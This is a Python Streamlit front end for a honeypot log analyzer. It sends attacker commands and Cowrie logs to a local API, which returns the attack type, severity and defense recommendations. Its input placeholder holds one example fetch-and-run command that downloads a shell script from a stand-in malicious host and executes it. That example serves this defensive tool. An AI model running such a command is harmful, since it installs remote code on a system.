import streamlit as st
import requests
import json
import time

API_URL = "http://localhost:8000"   # FastAPI base URL

st.set_page_config(
    page_title="LLM Honeypot Log Analyzer",
    page_icon="🛡️",
    layout="wide"
)

st.title("🛡️ LLM Honeypot Log Analyzer")
st.caption("Classify attacker commands & get defense recommendations.")

# -------------------------
# SECTION 1 — Manual Log Test
# -------------------------
st.header("🔍 Test a Single Command")

log_input = st.text_area(
    "Enter attacker command",
    placeholder="Example: wget http://malicious.com/x.sh && bash x.sh",
    height=120
)

if st.button("Classify Command", use_container_width=True):
    if not log_input.strip():
        st.error("Please enter a command.")
    else:
        with st.spinner("Analyzing…"):
            res = requests.post(f"{API_URL}/classify", json={"log": log_input})

        if res.status_code != 200:
            st.error(res.text)
        else:
            data = res.json()

            st.subheader("📌 Classification Result")
            st.write(f"**Attack Type:** `{data.get('attack_type','unknown')}`")
            st.write(f"**Severity:** ⭐ {data.get('severity',0)}/10")

            st.write("**Summary:**")
            st.info(data.get("summary",""))

            st.write("**Recommendations:**")
            recs = data.get("recommendations", [])
            if recs:
                st.success("\n".join([f"- {r}" for r in recs]))
            else:
                st.write("No recommendations.")

# -----------------------------------
# SECTION 2 — Upload Cowrie JSON logs
# -----------------------------------
st.header("📁 Upload Cowrie Logs (JSON / JSONL)")

cowrie_file = st.file_uploader("Choose a Cowrie log file", type=["json", "jsonl"])

if cowrie_file:
    st.success("File loaded. Click Analyze to process.")

    if st.button("Analyze File", use_container_width=True):
        events = []

        for line in cowrie_file.readlines():
            try:
                events.append(json.loads(line))
            except Exception:
                pass

        st.write(f"Loaded {len(events)} Cowrie events")

        results = []
        progress = st.progress(0)

        for i, ev in enumerate(events):
            res = requests.post(f"{API_URL}/ingest/cowrie", json=ev)

            if res.status_code == 200:
                payload = res.json()
                # backend returns {"count": x, "results": [...]}
                if isinstance(payload, dict) and "results" in payload:
                    results.extend(payload["results"])

            progress.progress((i + 1) / len(events))

        st.success("Analysis complete!")

        # -------------------------
        # Display results
        # -------------------------
        for r in results:
            eventid = r.get("eventid", "unknown")
            cmd = r.get("extracted_command", "<none>")
            attack = r.get("attack_type", "unknown")

            with st.expander(f"[{eventid}] {cmd} — {attack}"):

                st.write("### Summary")
                st.info(r.get("summary", "No summary available"))

                st.write("### Severity")
                st.write(f"⭐ {r.get('severity', 0)}/10")

                st.write("### Recommendations")
                recs = r.get("recommendations", [])
                if recs:
                    st.success("\n".join([f"- {x}" for x in recs]))
                else:
                    st.write("No recommendations.")
